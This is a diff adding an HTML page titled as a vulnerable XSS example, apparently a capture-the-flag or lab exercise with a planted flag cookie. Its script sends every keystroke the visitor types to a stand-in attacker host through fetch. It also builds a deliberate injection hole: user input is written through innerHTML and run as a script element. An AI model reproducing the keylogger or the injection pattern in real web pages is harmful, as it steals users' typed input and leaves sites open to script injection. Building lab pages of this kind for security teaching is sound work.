@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerable XSS Example</title>
+</head>
+<body>
+    <h1>XSS Vulnerability keylogger Example</h1>
+    <p>This is a vulnerable page with an XSS keylogger vulnerability.</p>
+    <form>
+        <label for="inputText">Enter some text:</label>
+        <input type="text" id="inputText">
+        <button type="button" onclick="displayText()">Submit</button>
+    </form>
+    <div id="output"></div>
+    <script>
+        document.cookie = "ftCookies=If_You_See_Me_Its_Win";
+        document.addEventListener('keydown', function(event){
+            var url = 'http://malicious-site.com/log?key=' + encodeURIComponent(event.key);
+            fetch(url);
+        });
+        function displayText() {
+            var userInput = document.getElementById("inputText").value;
+            document.getElementById("output").innerHTML = "<b>" + userInput + "</b>";
+
+            var script = document.createElement("script");
+            script.textContent = userInput;
+            document.body.appendChild(script);
+        }
+    </script>
+
+    <div id="cookieOutput"></div>
+</body>
+</html>
